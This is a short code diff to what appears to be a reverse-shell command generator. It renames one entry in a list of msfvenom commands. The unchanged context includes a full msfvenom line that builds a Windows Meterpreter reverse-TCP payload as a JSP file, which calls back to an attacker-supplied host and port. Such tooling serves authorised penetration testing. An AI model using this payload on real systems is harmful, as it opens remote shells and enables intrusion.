@@ -405,7 +405,7 @@ const msfvenomCommands =  withCommandType(
             "meta": ["msfvenom", "windows", "stageless", "reverse"]
         },
         {
-            "name": "Windows Staged JSP TCP",
+            "name": "Windows Staged JSP Reverse TCP",
             "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
             "meta": ["msfvenom", "windows", "staged", "reverse"]
         },
